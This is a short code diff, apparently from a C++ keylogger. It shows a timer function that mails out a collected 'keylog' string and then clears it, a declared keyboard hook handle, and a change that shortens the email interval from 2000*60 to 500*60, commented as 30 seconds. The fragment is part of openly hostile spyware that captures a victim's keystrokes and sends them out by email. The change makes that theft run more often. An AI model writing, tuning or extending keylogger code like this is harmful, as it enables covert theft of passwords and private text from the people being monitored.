@@ -33,7 +33,7 @@ void TimerSendMail()
 		keylog = ""; // if sent clear keylog
 }
 
-Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite); // time to send
+Timer MailTimer(TimerSendMail, 500 * 60, Timer::Infinite); // time to send (30 seconds)
 
 HHOOK eHook = NULL; // pointer to our hook
 
